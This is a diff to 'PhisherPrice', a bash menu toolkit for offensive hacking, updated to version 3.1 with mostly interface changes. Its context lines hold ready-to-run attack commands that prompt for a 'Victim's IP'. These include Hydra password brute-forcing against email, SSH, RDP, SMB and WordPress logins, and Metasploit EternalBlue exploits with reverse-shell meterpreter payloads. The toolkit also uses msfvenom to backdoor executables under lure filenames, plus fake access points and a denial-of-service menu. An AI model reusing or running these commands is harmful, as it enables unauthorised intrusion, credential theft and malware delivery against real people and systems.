@@ -1,15 +1,30 @@
 #!/bin/bash
 ## rjwdlu4eva
-## PhiserPrice 3.0 (ALPHA)
+## PhiserPrice 3.1 (ALPHA)
 if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root" 
    echo "You Forgot To Say The Magic Word, bRuHhh cmon" 
    exit 1
 fi
+if [ -f /etc/bash_completion.d/readline ]; then
+    . /etc/bash_completion.d/readline
+fi
+
 i="0"
 clear
 while [ $i -lt 1 ]
 do
+
+HISTFILE="$HOME/.bash_history"
+history -a "$HISTFILE"
+
+if [[ $- == *i* ]]; then
+    bind '"\e[A": history-search-backward'
+    bind '"\e[B": history-search-forward'
+    bind '"\e[C": forward-char'
+    bind '"\e[D": backward-char'
+fi
+history -r
 clear
 #API KEYS
 phone_lookup_api_key=REPLACE_ME_WITH_YOUR_API_KEY
@@ -30,7 +45,7 @@ banner='
   \_  /_/   /.
    \__/_   <   \e[1;31m PhisherPrice \e[1;33m
    /<<< \_\_ \e[1;31m Happy Hour Playset \e[1;33m
-  /,)^>>_._ \ \e[1;31m Version 3.0 \e[1;33m
+  /,)^>>_._ \ \e[1;31m Version 3.1 Alpha \e[1;33m
   (/   \\ /\\\
        // //```
 ======((`((====\e[1;34m'
@@ -62,7 +77,7 @@ update='u'
 contact='c'
 
 echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"ToolSet$Blue]:"
-echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
+read -e -p" └─────► " x
 
 if [ "$x" == "$option1" ]; then                    #Option1
 clear
@@ -77,7 +92,7 @@ Recon & Auditing
 (4) DNS Lookup
 (5) Reverse DNS Lookup
 (6) Shared DNS Lookup
-(7) Nmap Scan
+(7) Nmap Scan (w/OS Detection)
 (8) SSH Scanner (Scan for weak cyphers)
 (9) SSL/TLS Scanner (Scan for weak cyphers)
 (10) Retreive HTTP Headers
@@ -120,16 +135,17 @@ sub22='21'
 sub23='22'
 
 echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Recon & Audit$Blue]:"
-echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
+read -e -p" └─────► " x
 
 if [ "$x" == "$sub2" ]; then                    #Sub-Option-2
 clear
 echo "Enter website domain:"
-read domain
-
- echo -e "\n----------------------------------------"
+read -e domain
+history -a
+echo "$domain" >> ~/.bash_history
+echo -e "\n----------------------------------------"
 echo "Gathering Information About Host:"
-echo "$domain"
+
 echo "-------------------------------"
 
 response=$(whois $domain)
@@ -143,13 +159,12 @@ else
   echo -e "$response"
   
   echo -e "\nDo you want to save the information to a file? (y/n)"
-  read saveToFile
+  read -e -p saveToFile
   if [[ $saveToFile == "y" ]]; then
     echo -e "$response" > "$domain.txt"
     echo "Information saved to file: $domain.txt"
   fi
 fi
-
 read -p "Press enter to continue."
 
 elif [ "$x" == "$sub3" ]; then                    #Sub-Option-3
@@ -163,11 +178,12 @@ echo -e '\e[1;33m
         \/     \/                     \e[1;34m
 ' 
 echo "Enter IP or Domain:"
-read subop3
+read -e subop3
+history -a
 
 echo -e "\n-------------------------------"
 echo "Getting Geo IP Information for:"
-echo "$subop3"
+echo "$subop3" >> ~/.bash_history
 echo "-------------------------------"
 
 response=$(curl -s "https://api.hackertarget.com/geoip/?q=$subop3")
@@ -194,11 +210,11 @@ __________._____________  .____                  __
         \/      Reverse IP Lookup \/                 \/     |__|    \e[1;34m
 '  
 echo "Enter IP or Domain:"
-read subop4
-
+read -e subop4
+history -a
 echo -e "\n-------------------------------"
 echo "Getting IP Information for:"
-echo "$subop4"
+echo "$subop4" >> ~/.bash_history
 echo "-------------------------------"
 
 response=$(curl -s "http://api.hackertarget.com/reverseiplookup/?q=$subop4")
@@ -224,11 +240,11 @@ ________    _______    _________ .____                  __
         \/         \/        \/          \/                 \/     |__|    \e[1;34m
 '  
 echo "Enter IP Address, IP Range or Domain Name:"
-read subop5
-
+read -e subop5
+history -a
 echo -e "\n-------------------------------"
 echo "Getting DNS Information for:"
-echo "$subop5"
+echo "$subop5" >> ~/.bash_history
 echo "-------------------------------"
 
 response=$(curl -s "http://api.hackertarget.com/dnslookup/?q=$subop5")
@@ -254,11 +270,11 @@ __________                                         ________    _______    ______
         \/     \/          \/           \/     \/          \/         \/        \/ \e[1;34m
 ' 
 echo "Enter IP or domain:"
-read subop6
-
+read -e subop6
+history -a
 echo -e "\n-------------------------------"
 echo "Getting DNS information for:"
-echo "$subop6"
+echo "$subop6" >> ~/.bash_history
 echo "-------------------------------"
 
 response=$(curl -s "https://api.hackertarget.com/reversedns/?q=$subop6")
@@ -285,11 +301,11 @@ echo -e '\e[1;33m
         \/      \/     \/            \/     \/          \/         \/        \/ \e[1;34m
 ' 
 echo "Enter IP Or Domain."
-read subop7
-
+read -e subop7
+history -a
 echo -e "\n-------------------------------"
 echo "Finding Shared DNS Servers for:"
-echo "$subop7"
+echo "$subop7" >> ~/.bash_history
 echo "-------------------------------"
 
 response=$(curl -s "https://api.hackertarget.com/findshareddns/?q=$subop7")
@@ -323,25 +339,32 @@ echo -e '\e[1;33m
         \/         \/         \/                   \/     \/     \/     \/ \e[1;34m
 '
 echo "Enter IP Or Domain."
-read subop8
+read -e subop8 
+history -a
+echo -e "$subop8" >> ~/.bash_history
+
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!!!!!   Getting Open Ports      !!!!!
+!!!!!!!!   Getting Open Ports     !!!!!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
  
 '
 
-curl http://api.hackertarget.com/nmap/?q=$subop8
+nmap_output=$(sudo nmap -p- --open -O $subop8)
 
-echo -e '
+if [[ $nmap_output == *"0 hosts up"* ]]; then
+  echo "No open ports found."
+else
+  echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!    Open Ports Found Using PhiserPrice     !!!
+!!!    Open Ports Found Using nmap     !!!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
  
 '
+  echo "$nmap_output"
+fi
 
 read
-
 elif [ "$x" == "$sub9" ]; then                    #sshscanner
 clear
 function scan_ciphers() {
@@ -387,22 +410,24 @@ echo -e '
 /_______  /_______  /\___|_  /  /_______  /\___  >____  /___|  /___|  /\___  >__|   
         \/        \/       \/           \/     \/     \/     \/     \/     \/       
 '
-printf "Enter host: "
-read host
-printf "Enter port: "
-read port
+echo -e "Enter host: "
+read -e host
+history -a
+echo -e "Enter port: "
+read -e port
 
 scan_ciphers "$host" "$port"
 elif [ "$x" == "$sub10" ]; then                    #Sub-Option-10
 clear
 echo "Enter the host you want to scan (e.g. testsite.com):"
-read host
+read -e host
 echo "Enter the host port you want to scan (e.g. 443):"
-read port
+read -e port
 clear
+echo"$host"  >> ~/.bash_history
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!   Scanning host SSL/TLS for vulns    !
+!   Scanning host SSL/TLS for vulns   !
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 '
 
@@ -430,7 +455,7 @@ echo -e '
 '
 
 echo "Do you want to save the output to a text file? (y/n)"
-read save_option
+read -e save_option
 
 if [[ $save_option == "y" || $save_option == "Y" ]]; then
   echo -e "\nSaving output to file...\n"
@@ -456,11 +481,11 @@ echo -e '\e[1;33m
        \/  HTTP Header Scan                      \/     \/     \/     \/ \e[1;34m
 '
 echo "Enter the host you want to scan:"
-read subop11
-
+read -e subop11
+history -a
 echo -e "\n-------------------------------"
 echo "Checking HTTP Headers for:"
-echo "$subop11"
+echo "$subop11"  >> ~/.bash_history
 echo "-------------------------------"
 
 status=$(curl -sI $subop11 | head -n 1 | cut -d' ' -f2)
@@ -489,11 +514,11 @@ echo -e '\e[1;33m
 '  
 echo "Enter the ASN you want to scan:"
 echo "Example usage: 1.1.1.1 / AS15169"
-read subop12
-
+read -e subop12
+history -a
 echo -e "\n-------------------------------"
 echo "Scanning host for ASN:"
-echo "$subop12"
+echo "$subop12"  >> ~/.bash_history
 echo "-------------------------------"
 
 response=$(curl -s https://api.hackertarget.com/aslookup/?q=$subop12)
@@ -525,11 +550,11 @@ __________                                       ________            ___.
         \/      \/     \/     \/     \/                \/           \/    \/ \e[1;34m
 ' 
 echo "Enter the IP address or domain name you want to scan:"
-read subop13
-
+read -e subop13
+history -a
 echo -e "\n-----------------------------------"
 echo "Scanning host information for:"
-echo "$subop13"
+echo "$subop13"  >> ~/.bash_history
 echo "-----------------------------------"
 
 response=$(curl -sS https://api.hackertarget.com/bannerlookup/?q="$subop13")
@@ -557,11 +582,11 @@ echo -e '\e[1;33m
 '
 echo "This can reveal social media pages, etc."
 echo "Enter domain name:"
-read domain
-
+read -e domain
+history -a
 echo -e "\n-----------------------------"
 echo "Extracting host links for:"
-echo "$domain"
+echo "$domain"  >> ~/.bash_history
 echo "-----------------------------"
 
 result=$(curl -s https://api.hackertarget.com/pagelinks/?q=$domain)
@@ -598,22 +623,20 @@ __________.__                           .____                  __
 '
 echo "Please Enter The Number Followed By The Dialing Code"
 echo "for example : +447410490080 / +44 Is My Dialing Code"
-read subop15
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!  Looking Up Info About The Number  !!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-'
+read -e subop15
+history -a
+
+echo -e "\n-----------------------------"
+echo "Looking Up Info About The Number:"
+echo "$subop15"  >> ~/.bash_history
+echo "-----------------------------"
 curl --request GET "https://api.apilayer.com/number_verification/validate?number=$subop15" \
 --header "apikey: $phone_lookup_api_key"
 
-echo -e '
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!!!!!     Phone Info Found Using PhisherPrice    !!!!!
-!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-'
-
-read
+echo -e "\n-----------------------------"
+echo "Phone Info Found Using PhisherPrice"
+echo "-----------------------------"
+read -p "Press enter to continue."
 
 elif [ "$x" == "$sub16" ]; then                    #Sub-Option-16
 clear
@@ -628,10 +651,11 @@ __________              _____                .__           __  .__
 echo "Find Domains Using Same Google Ad-Sense ID"
 echo "Enter Domain Name Or GA-ID"
 echo "For example: UA-11223344 or testsite.com"
-read subop16
-
+read -e subop16
+history -a
 echo -e '\n----------------------------------'
-echo "Retrieving Hosts/GA-ID for: $subop16"
+echo "Retrieving Hosts/GA-ID for:"
+echo "subop16"  >> ~/.bash_history
 echo '----------------------------------'
 
 result=$(curl -s https://api.hackertarget.com/analyticslookup/?q=$subop16)
@@ -662,11 +686,11 @@ echo -e '\e[1;33m
              \/     \/                \/     \/     \/            \/     \/ \e[1;34m
 '
 echo "Enter Domain Name Or IP:"
-read subop17
-
+read -e subop17
+history -a
 echo -e "\n-----------------------------"
 echo "Retrieving Host Users for:"
-echo "$subop17"
+echo "$subop17" >> ~/.bash_history
 echo "-----------------------------"
 users=$(enum4linux -M -G -P -S -U $subop17)
 
@@ -701,25 +725,25 @@ echo -e '\e[1;33m
         \/        \__>       \/         \/     \/|__|   |__|        \/       \e[1;34m
 '
 echo "Enter Domain Name Or IP:"
-read sql1
-
+read -e sql1
+history -a
 echo "Database Type If You Know It, If Not Leave This Blank"
 echo "Press Enter If You're Unsure"
-read db
+read -e db
 
 echo "Level of tests to perform (1-5, default 1)"
-read levelt
+read -e levelt
 
 echo "Risk of tests to perform (1-3, default 1)"
-read risksl
+read -e risksl
 
 echo "SQL injection techniques to use (default: BEUSTQ)"
 echo "Press Enter To Leave Default"
-read techskill
+read -e techskill
 
 echo -e "\n-----------------------------"
 echo "Auditing Host SQL Info for:"
-echo "$sql1"
+echo "$sql1" >> ~/.bash_history
 echo "-----------------------------"
 sqlmap --dbms="$db" --forms --crawl=2 --level="${levelt:-1}" --risk="${risksl:-1}" --random-agent --all --technique="${techskill:-BEUSTQ}" -u "$sql1"
 
@@ -748,9 +772,9 @@ echo -e '\e[1;33m
         \/        \__>       \/ Brute Force \e[1;34m
 '
 echo "Enter Website"
-read sqlhost2
+read -e sqlhost2
 echo "php or html ?"
-read phphtml1
+read -e phphtml1
 
 output=$(sqlmap -u $sqlhost2 searchgetby_id.$phphtml1?id=4 --dbs --columns -D scanme --tamper=space2comment --level 5)
 
@@ -768,7 +792,7 @@ clear
 echo -e '\e[1;33mMSPLOIT VULN SCANNER\e[0m'
 echo -e "\n-------------------------------------------"
 echo -e "\e[1;36mEnter Victim's IP:\e[0m"
-read victim_ip
+read -e victim_ip
 
 echo -e "\n\e[1;36m------------------------------\e[0m"
 echo -e "\e[1;36mRunning nmap with vuln script...\e[0m"
@@ -809,7 +833,7 @@ echo -e '\e[1;33m
 BIN Checker \e[1;34m
 '
 echo "Enter The BIN Number:"
-read r
+read -e r
 
 curl --request GET \
     --url https://bank-card-bin-num-check.p.rapidapi.com/api/v1/bins/b/$r \
@@ -827,7 +851,7 @@ Email Validator \e[1;34m
 '
 echo "Enter the email address to verify:"
 
-read email
+read -e email
 
 curl --location --request GET "https://api.apilayer.com/email_verification/${email}" \
 --header "apikey: ${email_validator_api_key}"
@@ -957,7 +981,7 @@ dumpitall='10'
 
 wait
 echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Cracking/Brute$Blue]:"
-echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
+read -e -p" └─────► " x
 
 if [ "$x" == "$bluetoothc" ]; then                    #blueooth
 clear
@@ -978,7 +1002,7 @@ bscan='1'
 bcrack='2'
 
 echo -e $Blue" ┌─["$red"PhisherPrice$BlueF]──[$red~$Blue]─["$yellow"Bluetooth-Toolkit$Blue]:"
-echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
+read -e -p" └─────► " x
 
 if [ "$x" == "$bscan" ]; then                    #bscan
 echo -e "\nBluetooth device scanner"
@@ -1000,7 +1024,7 @@ echo "$devices"
 
 echo -e "\n-------------------------------------------"
 echo -e "Enter the MAC address of the device to connect: "
-read mac_address
+read -e mac_address
 
 echo "Connecting to $mac_address..."
 rfcomm connect /dev/rfcomm0 "$mac_address" 1 &
@@ -1019,9 +1043,9 @@ echo -e "\e[1;33mBluetooth PIN Code Cracking Script.\e[0m"
 echo -e "\n-------------------------------------------"
 
 echo -n "Enter the MAC address of the target device: "
-read mac_address
+read -e mac_address
 echo -n "Enter the name of the PIN code file: "
-read pin_file
+read -e pin_file
 
 clear
 echo -e "\n-------------------------------------------"
@@ -1088,7 +1112,7 @@ newoption1='9'
 HYDRAWPAUTOBRUTE='10'
 
 echo -e $Blue" ┌─["$red"PhisherPrice$BlueF]──[$red~$Blue]─["$yellow"Hydra$Blue]:"
-echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
+read -e -p" └─────► " x
 
 
 if [ "$x" == "$nohydra" ]; then                    #no hydra
@@ -1141,7 +1165,7 @@ for service in "${!imap_options[@]}"; do
   echo "[$service] ${imap_options[$service]}"
 done
 
-read -p "Email service: " email_service
+read -e "Email service: " email_service
 
 # Select protocol and port based on the email service chosen
 case $email_service in
@@ -1168,15 +1192,15 @@ esac
 
 # Get email address and password file path
 echo -n "Enter email address: "
-read email
+read -e email
 echo -n "Enter password file path: "
-read password_file
+read -e password_file
 
 # Select protocol and port
 echo -n "Enter protocol (smtp/pop3/imap): "
-read protocol
+read -e protocol
 echo -n "Enter port number: "
-read port
+read -e port
 
 echo -e "\n-------------------------------------------"
 echo -e "\e[1;34mCracking email password...\e[0m"
@@ -1231,16 +1255,16 @@ echo -e "\e[1;33mSimple Email Cracking Script Using Hydra.\e[0m"
 echo -e "\n-------------------------------------------"
 
 echo -n "Choose a SMTP service (Gmail = smtp.gmail.com / Yahoo = smtp.mail.yahoo.com / Hotmail = smtp.live.com): "
-read smtp
+read -e smtp
 
 echo -n "Enter Email Address: "
-read email
+read -e email
 
 echo -n "Provide Directory of Wordlist for Passwords: "
-read wordlist
+read -e wordlist
 
 echo -n "Enter SMTP Port Number (default is 465): "
-read port
+read -e port
 port=${port:-465}  # set default port number if no input is provided
 
 echo -e "\n-------------------------------------------"
@@ -1273,9 +1297,9 @@ echo -e '\e[1;33m
 echo "Simple SNMP Password Cracking Script Using Hydra"
 echo -e "\n-------------------------------------------"
 echo "Enter the path of the password list:"
-read hydrasnmppass
+read -e hydrasnmppass
 echo "Enter The Host IP Address of SNMP Server:"
-read hydraip
+read -e hydraip
 
 echo -e "\n-----------------------------"
 echo "Attempting SNMP password cracking..."
@@ -1310,11 +1334,11 @@ ________________________________
 echo "FTP Password Cracking Script Using Hydra"
 echo -e "\n-------------------------------------------"
 echo "Enter Known User:"
-read hydrauser
+read -e hydrauser
 echo "Enter Password List Location:"
-read hydrapasslist
+read -e hydrapasslist
 echo "Enter the IP Address:"
-read hydraip
+read -e hydraip
 
 echo -e "\n-------------------------------------------"
 echo "Running hydra..."
@@ -1344,11 +1368,11 @@ echo -e '\e[1;33m
 echo "SSH Password Cracking Script Using Hydra"
 echo -e "\n-------------------------------------------"
 echo "Enter User List Location:"
-read hydrauser2
+read -e hydrauser2
 echo "Enter Password List Location:"
-read hydrapasslist2
+read -e hydrapasslist2
 echo "Enter IP Address:"
-read hydraip2
+read -e hydraip2
 
 echo -e "\n-------------------------------------------"
 echo "Running hydra..."
@@ -1373,11 +1397,11 @@ clear
 echo -e "\nFTP Password Cracking Script Using Hydra"
 echo -e "\n-------------------------------------------"
 echo "Enter Known User:"
-read hydrauser
+read -e hydrauser
 echo "Enter Password List Location:"
-read hydrapasslist
+read -e hydrapasslist
 echo "Enter the IP Address:"
-read hydraip
+read -e hydraip
 
 echo -e "\n-------------------------------------------"
 echo "Running hydra..."
@@ -1399,17 +1423,17 @@ elif [ "$x" == "$HYDRAWPAUTOBRUTE" ]; then                    #hynull-Option-9
 clear
 echo "Hydra WP Auto Brute"
 echo "Enter target URL (e.g. target.com):"
-read url
+read -e url
 echo "Enter path to login page (e.g. /wp-login.php):"
-read path
+read -e path
 echo "Enter username or path to wordlist:"
-read user
+read -e user
 echo "Enter password or path to wordlist:"
-read pass
+read -e pass
 echo "Enter a string that appears on a failed login page:"
-read bad
+read -e bad
 echo "Enter POST parameter string (e.g. 'log=^USER^&pwd=^PASS^'):"
-read parameter
+read -e parameter
 
 clear
 echo -e "\n-------------------------------------------"
@@ -1452,11 +1476,11 @@ ______   ____ ______\_____  \
 echo "POP3 Password Cracking Script Using Hydra"
 echo -e "\n-------------------------------------------"
 echo "Enter Known User or User List:"
-read hydrauser
+read -e hydrauser
 echo "Enter Password List Location:"
-read hydrapasslist
+read -e hydrapasslist
 echo "Enter IP Address:"
-read hydraip
+read -e hydraip
 
 echo -e "\n-------------------------------------------"
 echo "Running hydra..."
@@ -1489,13 +1513,13 @@ echo -e '\e[1;33m
 echo "HTTP Basic Authentication Password Cracking Script Using Hydra"
 echo -e "\n-------------------------------------------"
 echo "Enter User List Location:"
-read hydrauser
+read -e hydrauser
 echo "Enter Password List Location:"
-read hydrapasslist
+read -e hydrapasslist
 echo "Enter IP Address:"
-read hydraip
+read -e hydraip
 echo "Enter the 401 Login Realm"
-read hyhost
+read -e hyhost
 
 echo -e "\n-------------------------------------------"
 echo "Running Hydra..."
@@ -1528,13 +1552,13 @@ __________________ __________
 echo "RDP Password Cracking Script Using Hydra"
 echo -e "\n-------------------------------------------"
 echo "Enter the username or username list file path:"
-read hydrauser8
+read -e hydrauser8
 
 echo "Enter the password list file path:"
-read hydrapasslist8
+read -e hydrapasslist8
 
 echo "Enter the target IP address:"
-read hydraip8
+read -e hydraip8
 
 if [ -f "$hydrauser8" ]; then
   hydrauser8="-M $hydrauser8"
@@ -1571,11 +1595,11 @@ echo -e '\e[1;33m
 echo "SMB Password Cracking Script Using Hydra"
 echo -e "\n-------------------------------------------"
 echo "Enter Known User or User List:"
-read hydrauser
+read -e hydrauser
 echo "Enter Password List Location:"
-read hydrapasslist
+read -e hydrapasslist
 echo "Enter the IP Address:"
-read hydraip
+read -e hydraip
 
 echo -e "\n-------------------------------------------"
 echo "Running hydra..."
@@ -1606,14 +1630,14 @@ clear
 echo -e "\nPassword Cracking Script Using John the Ripper"
 echo -e "-------------------------------------------\n"
 echo "Enter the path to your wordlist (e.g. /usr/share/john/password.lst): " 
-read wordlist
+read -e wordlist
 echo "Enter the path to the file to crack (e.g. /usr/john/Documents/unshadowed.txt): " 
-read file
+read -e file
 
 if ! [ -f "$wordlist" ]; then
     clear
     echo "Error: The wordlist file doesn't exist or is inaccessible."
-    read -p "Press Enter to continue." 
+    read -e "Press Enter to continue." 
 fi
 
 if ! [ -f "$file" ]; then
@@ -1626,8 +1650,8 @@ echo -e "\n-------------------------------------------"
 echo "Starting cracking process..."
 echo -e "-------------------------------------------\n"
 
-read -p "Enter the mode of attack (wordlist, mask, hybrid): " mode
-read -p "Enter the number of CPU cores to use (1-8): " cores
+read -e "Enter the mode of attack (wordlist, mask, hybrid): " mode
+read -e "Enter the number of CPU cores to use (1-8): " cores
 
 john --wordlist="$wordlist" --rules --format=NT --session=john --fork="$cores" --progress="$mode" "$file"
 
@@ -1639,15 +1663,15 @@ read -p "Press Enter to continue."
 
 elif [ "$x" == "$john2" ]; then                    #john2
 echo "Enter the path to the archive file:"
-read archive
+read -e archive
 
 if [ ! -f "$archive" ]; then
 echo "File not found!"
-read -p "Press Enter to continue." 
+read -e "Press Enter to continue." 
 fi
 
 echo "Enter the path to the password list file:"
-read passlist
+read -e passlist
 
 if [ ! -f "$passlist" ]; then
 echo "File not found!"
@@ -1703,11 +1727,11 @@ echo -e "-------------------------------------------\n"
 
 # Prompt user for input
 echo "Enter Hash Type (500 = md5crypt): " 
-read encmode
+read -e encmode
 echo "Enter Hash Location (e.g. /usr/share/me/example500.hash): " 
-read hashtype
+read -e hashtype
 echo "Enter Wordlist Location (e.g. /usr/share/wordlists/sqlmap.txt): " 
-read wordlist
+read -e wordlist
 
 # Check if the specified files exist
 if ! [[ -f $hashtype ]]; then
@@ -1753,9 +1777,9 @@ echo -e "\nAircrack-ng WPA Password Cracking Script"
 echo -e "-------------------------------------------\n"
 
 echo "Enter the location of the password list: "
-read wifirip
+read -e wifirip
 echo "Enter the location of the capture file (.cap): "
-read subopi
+read -e subopi
 
 if ! [[ -f "$wifirip" ]]; then
   echo "Error: Password list file not found."
@@ -1799,7 +1823,7 @@ read -p "Press Enter to continue."
 
 elif [ "$x" == "$honeywhy" ]; then                    #hynull-Option-9
 echo -n "Enter wireless interface (e.g. wlan1 or wlan0): "
-read iface
+read -e iface
 
 echo "Putting wireless interface into monitor mode..."
 ip link set dev $iface down
@@ -1808,9 +1832,9 @@ ip link set dev $iface up
 airmon-ng start $iface
 
 echo -n "Enter target ESSID: "
-read essid
+read -e essid
 echo -n "Enter target channel: "
-read ch
+read -e ch
 
 echo "Creating four fake access points with name $essid..."
 xterm -hold -e "airbase-ng --essid $essid -a aa:aa:aa:aa:aa:aa -c $ch mon0" &
@@ -1823,7 +1847,7 @@ xterm -hold -e "airbase-ng --essid $essid -a dd:dd:dd:dd:dd:dd -c $ch mon0 -W 1 
 pid4=$!
 
 echo -n "Enter a name for the output file: "
-read fname
+read -e fname
 xterm -hold -e "airodump-ng --channel $ch --write $fname mon0" &
 pid5=$!
 
@@ -2128,7 +2152,7 @@ auto18='18'
 
 wait
 echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Auto Xsploit$Blue]:"
-echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
+read -e -p" └─────► " x
 
 if [ "$x" == "$auto1" ]; then                    #auto-Option-1
 ip=$(ip addr show wlan0 | awk '/inet / {print $2}' | cut -d/ -f 1)
@@ -2161,12 +2185,12 @@ scub7='7'
 scub8='8'
 
 echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Scanners$Blue]:"
-echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
+read -e -p" └─────► " x
 
 if [ "$x" == "$scub1" ]; then                    #scub-Option-1
 clear
 echo "Victim's IP:"
-read r
+read -e r
 
 msfconsole -q -x " use auxiliary/scanner/smb/smb_ms17_010; set rhosts $r ; exploit ;exit ;"
 echo ' '
@@ -2177,7 +2201,7 @@ read
 elif [ "$x" == "$scub2" ]; then                    #scub-Option-2
 clear
 echo "Victim's IP:"
-read r
+read -e r
 
 msfconsole -q -x " use auxiliary/scanner/smb/pipe_auditor; set rhosts $r ; exploit ;exit ;"
 echo ' '
@@ -2188,7 +2212,7 @@ read
 elif [ "$x" == "$scub3" ]; then                    #scub-Option-3
 clear
 echo "Victim's IP:"
-read r
+read -e r
 
 msfconsole -q -x " use auxiliary/scanner/smb/pipe_dcerpc_auditor; set rhosts $r ; exploit ;exit ;"
 echo ' '
@@ -2199,7 +2223,7 @@ read
 elif [ "$x" == "$scub4" ]; then                    #scub-Option-4
 clear
 echo "Victim's IP:"
-read r
+read -e r
 
 msfconsole -q -x " use auxiliary/scanner/smb/smb2; set rhosts $r ; exploit ;exit ;"
 echo ' '
@@ -2210,7 +2234,7 @@ read
 elif [ "$x" == "$scub5" ]; then                    #scub-Option-5
 clear
 echo "Victim's IP:"
-read r
+read -e r
 
 msfconsole -q -x " use auxiliary/scanner/smb/smb_enumusers; set rhosts $r ; exploit ;exit ;"
 echo ' '
@@ -2220,11 +2244,11 @@ read
 elif [ "$x" == "$scub6" ]; then                    #scub-Option-6
 clear
 echo "Victim's IP:"
-read r
+read -e r
 echo "Victim's Password:"
-read passmb
+read -e passmb
 echo "Victim's User Account:"
-read accsmb
+read -e accsmb
 
 msfconsole -q -x " use auxiliary/scanner/smb/smb_login; set rhosts $r ; set SMBPass $passmb ; set SMBUser $accsmb ; exploit ;exit ;"
 echo ' '
@@ -2234,7 +2258,7 @@ read
 elif [ "$x" == "$scub7" ]; then                    #scub-Option-7
 clear
 echo "Victim's IP:"
-read r
+read -e r
 
 msfconsole -q -x " use auxiliary/scanner/smb/smb_lookupsid; set rhosts $r ; exploit ;exit ;"
 echo ' '
@@ -2245,7 +2269,7 @@ read
 elif [ "$x" == "$scub8" ]; then                    #scub-Option-8
 clear
 echo "Victim's IP:"
-read r
+read -e r
 
 msfconsole -q -x " use auxiliary/scanner/smb/smb_version; set rhosts $r ; exploit ;exit ;"
 echo ' '
@@ -2264,7 +2288,7 @@ fi
 
 elif [ "$x" == "$auto2" ]; then                    #auto-Option-2
 echo "Victim's IP:"
-read r
+read -e r
 
 msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $ip ; set rhost $r ; exploit ; "
 
@@ -2273,26 +2297,26 @@ msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload win
 
 elif [ "$x" == "$auto3" ]; then                    #auto-Option-3
 echo "Victim's IP:"
-read r
+read -e r
 
 msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/vncinject/reverse_tcp;  set lhost $ip ; set rhost $r ; set viewonly false ; exploit ; "
 
 elif [ "$x" == "$auto4" ]; then                    #auto-Option-4
 echo "Victim's IP:"
-read r
+read -e r
 
 msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set payload windows/vncinject/reverse_tcp;  set lhost $ip ; set rhost $r ; set viewonly false ; exploit ; "
 
 elif [ "$x" == "$auto5" ]; then                    #auto-Option-5
 echo "Victim's IP:" 
-read r
+read -e r
 
 msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set lhost $ip ; set rhost $r ; exploit ;"
 
 
 elif [ "$x" == "$auto6" ]; then                    #auto-Option-6
 echo 'Uripath: (/)'
-read u
+read -e u
 msfconsole -q -x " use exploit/windows/misc/hta_server; set srvhost $ip; set uripath /$u; set payload windows/meterpreter/reverse_tcp; set lhost $ip ; exploit ;"
 
 elif [ "$x" == "$auto7" ]; then                    #auto-Option-7
@@ -2409,7 +2433,7 @@ msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/re
 
 elif [ "$x" == "$auto16" ]; then                    #auto-Option-16
 echo "your .exe location:"
-read exelocation
+read -e exelocation
 msfvenom -x $exelocation -k -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pornhub.exe
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -2423,7 +2447,7 @@ msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/re
 
 elif [ "$x" == "$auto17" ]; then                    #auto-Option-17
 echo "your .exe location:"
-read bindexelocation
+read -e bindexelocation
 msfvenom -x $bindexelocation -k -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -e x86/shikata_ga_nai -i 3 -b “\x00” -f exe > example.exe
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -2490,257 +2514,10 @@ eeng='9'
 kissmet1='10'
 whoney='11'
 subdosm='12'
-
-wait
 echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Networking$Blue]:"
-echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
+read -e -p" └─────► " x
 
-
-if [ "$x" == "$subdosm" ]; then                          #DOS
-clear
-	echo -e "${banner}"
-	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
-                   
-\e[0m\e[3;39m \e[1;31m
-Denial-Of-Service Toolkit
-\e[3;39m
-(1) Check If Vuln To DoS
-(2) Slowloris Attack
-(3) UDP/TCP Flood Attack
-(4) R-U-Dead-Yet Attack
-(5) SYN flood attack
